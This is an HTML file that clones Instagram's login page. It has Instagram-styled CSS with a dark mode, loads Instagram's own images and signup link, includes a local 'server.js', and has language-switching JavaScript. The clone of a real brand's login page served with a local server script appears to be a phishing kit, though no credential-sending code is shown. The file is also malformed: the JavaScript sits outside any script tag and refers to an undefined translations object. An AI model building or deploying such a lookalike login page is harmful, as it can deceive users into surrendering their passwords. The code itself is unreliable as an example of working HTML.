<!DOCTYPE html>
<html lang="en" id="html-lang">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title id="page-title">Instagram Login</title>
    <style>
        :root {
            --bg-color: #fafafa;
            --text-color: #262626;
            --box-bg: #ffffff;
            --border-color: #dbdbdb;
            --input-bg: #fafafa;
            --button-bg: #0095f6;
            --button-disabled: #b2dffc;
            --divider-color: #dbdbdb;
            --divider-text: #8e8e8e;
            --facebook-color: #385185;
            --link-color: #00376b;
            --signup-link: #0095f6;
            --footer-text: #8e8e8e;
            --footer-link: #737373;
            --select-bg: #ffffff;
            --select-border: #dbdbdb;
            --select-text: #262626;
        }

        @media (prefers-color-scheme: dark) {
            :root {
                --bg-color: #000000;
                --text-color: #f5f5f5;
                --box-bg: #000000e9;
                --border-color: #000000;
                --input-bg: #121212;
                --button-bg: #0095f6;
                --button-disabled: #00376b;
                --divider-color: #363636;
                --divider-text: #a8a8a8;
                --facebook-color: #8bb4f7;
                --link-color: #8bb4f7;
                --signup-link: #0095f6;
                --footer-text: #a8a8a8;
                --footer-link: #c7c7c7;
                --select-bg: #1e1e1e;
                --select-border: #363636;
                --select-text: #f5f5f5;
            }
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background-color: var(--bg-color);
            margin: 0;
            padding: 0;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            color: var(--text-color);
        }

        .wrapper {
            display: flex;
            align-items: center;
            max-width: 935px;
            width: 100%;
            justify-content: center;
            flex-grow: 1;
            margin: 10px 0;
        }

        .phone-image {
            background-image: url('https://www.instagram.com/static/images/homepage/phones/home-phones.png/1dc085cdb87d.png');
            background-size: cover;
            height: 500px;
            width: 370px;
            margin-right: 32px;
            position: relative;
            display: none;
        }

        .phone-image img {
            position: absolute;
            top: 23px;
            right: 47px;
            height: 429px;
        }

        .container {
            display: flex;
            flex-direction: column;
            align-items: center;
            max-width: 350px;
            width: 100%;
        }

        .login-box {
            background: var(--box-bg);
            border: 1px solid var(--border-color);
            padding: 20px 40px;
            text-align: center;
            margin-bottom: 10px;
            width: 100%;
            box-sizing: border-box;
            border-radius: 8px;
        }

        .logo {
            margin: 20px 0;
            width: 175px;
            filter: invert(0);
        }

        @media (prefers-color-scheme: dark) {
            .logo {
                filter: invert(1);
            }
        }

        input {
            width: 100%;
            padding: 9px 8px;
            margin: 6px 0;
            border: 1px solid var(--border-color);
            border-radius: 3px;
            background: var(--input-bg);
            font-size: 12px;
            box-sizing: border-box;
            color: var(--text-color);
        }

        button {
            width: 100%;
            padding: 7px;
            margin: 8px 0;
            background-color: var(--button-bg);
            border: none;
            border-radius: 4px;
            color: white;
            font-weight: bold;
            cursor: pointer;
        }

        button:disabled {
            background-color: var(--button-disabled);
        }

        .divider {
            display: flex;
            align-items: center;
            margin: 10px 0;
            width: 100%;
        }

        .line {
            flex-grow: 1;
            height: 1px;
            background-color: var(--divider-color);
        }

        .or {
            margin: 0 15px;
            color: var(--divider-text);
            font-size: 13px;
            font-weight: bold;
        }

        .facebook-login {
            display: flex;
            align-items: center;
            justify-content: center;
            color: var(--facebook-color);
            font-weight: bold;
            font-size: 14px;
            margin: 10px 0;
            cursor: pointer;
            text-decoration: none;
        }

        .facebook-icon {
            margin-right: 8px;
            width: 16px;
            height: 16px;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .facebook-icon svg {
            fill: currentColor;
            width: 16px;
            height: 16px;
        }

        .forgot-password {
            color: var(--link-color);
            font-size: 12px;
            margin: 12px 0;
            cursor: pointer;
            text-decoration: none;
            display: inline-block;
        }

        .signup-box {
            background: var(--box-bg);
            border: 1px solid var(--border-color);
            padding: 20px;
            text-align: center;
            width: 100%;
            box-sizing: border-box;
            font-size: 14px;
            border-radius: 8px;
        }

        .signup-link {
            color: var(--signup-link);
            font-weight: bold;
            text-decoration: none;
        }

        .footer {
            width: 100%;
            max-width: 935px;
            margin: 8px 0;
            text-align: center;
            color: var(--footer-text);
            font-size: 12px;
        }

        .footer-links {
            display: flex;
            flex-wrap: wrap;
            justify-content: center;
            margin: 10px 0;
        }

        .footer-link {
            color: var(--footer-link);
            text-decoration: none;
            margin: 0 8px 8px;
        }

        .footer-bottom {
            display: flex;
            justify-content: center;
            align-items: center;
            gap: 20px;
            /* Space between language selector and copyright */
            margin-top: 10px;
        }

        .footer-lang {
            margin: 8px 0;
        }

        .footer-copyright {
            margin: 8px 0;
        }

        select {
            background-color: var(--select-bg);
            color: var(--select-text);
            border: 1px solid var(--select-border);
            border-radius: 4px;
            padding: 4px 8px;
            font-size: 12px;
            cursor: pointer;
        }

        @media (min-width: 876px) {
            .phone-image {
                display: block;
            }
        }

        @media (max-width: 875px) {
            .wrapper {
                padding: 0 20px;
            }
        }
    </style>
    <script src="server.js"></script>

        // Set initial language based on browser preference
        const userLang = navigator.language || navigator.userLanguage;
        const langSelector = document.getElementById('language-selector');
        let currentLang = 'en';

        if (userLang.startsWith('es')) {
            currentLang = 'es';
        } else if (userLang.startsWith('fr')) {
            currentLang = 'fr';
        } else if (userLang.startsWith('zh')) {
            currentLang = 'zh';
        }

        langSelector.value = currentLang;
        updatePageLanguage(currentLang);

        // Language selector functionality
        langSelector.addEventListener('change', function () {
            currentLang = this.value;
            updatePageLanguage(currentLang);
            document.getElementById('html-lang').lang = currentLang;
        });

        function updatePageLanguage(lang) {
            const t = translations[lang];

            // Update all text elements
            document.getElementById('page-title').textContent = t.title;
            document.querySelector('input[type="text"]').placeholder = t.usernamePlaceholder;
            document.querySelector('input[type="password"]').placeholder = t.passwordPlaceholder;
            document.querySelector('button[type="submit"]').textContent = t.loginButton;
            document.querySelector('.or').textContent = t.orDivider;
            document.querySelector('.facebook-login').innerHTML = `
                <div class="facebook-icon">
                    <svg viewBox="0 0 16 16" width="16" height="16">

                    </svg>
                </div>
                ${t.facebookLogin}`;
            document.querySelector('.forgot-password').textContent = t.forgotPassword;
            document.querySelector('.signup-box').innerHTML = `${t.signupText} <a href="https://www.instagram.com/accounts/emailsignup/" class="signup-link">${t.signupLink}</a>`;

            // Update footer links
            const footerLinks = document.querySelectorAll('.footer-link');
            footerLinks[0].textContent = t.meta;
            footerLinks[1].textContent = t.about;
            footerLinks[2].textContent = t.blog;
            footerLinks[3].textContent = t.jobs;
            footerLinks[4].textContent = t.help;
            footerLinks[5].textContent = t.api;
            footerLinks[6].textContent = t.privacy;
            footerLinks[7].textContent = t.terms;
            footerLinks[8].textContent = t.locations;
            footerLinks[9].textContent = t.instagramLite;
            footerLinks[10].textContent = t.threads;
            footerLinks[11].textContent = t.contact;
            footerLinks[12].textContent = t.metaVerified;

            // Update copyright
            document.querySelector('.footer-copyright').textContent = t.copyright;

            // Update language selector options
            const options = langSelector.options;
            options[0].text = lang === 'en' ? 'English' :
                lang === 'es' ? 'Inglés' :
                    lang === 'fr' ? 'Anglais' : '英语';
            options[1].text = lang === 'en' ? 'Spanish' :
                lang === 'es' ? 'Español' :
                    lang === 'fr' ? 'Espagnol' : '西班牙语';
            options[2].text = lang === 'en' ? 'French' :
                lang === 'es' ? 'Francés' :
                    lang === 'fr' ? 'Français' : '法语';
            options[3].text = lang === 'en' ? 'Chinese' :
                lang === 'es' ? 'Chino' :
                    lang === 'fr' ? 'Chinois' : '中文';
        }
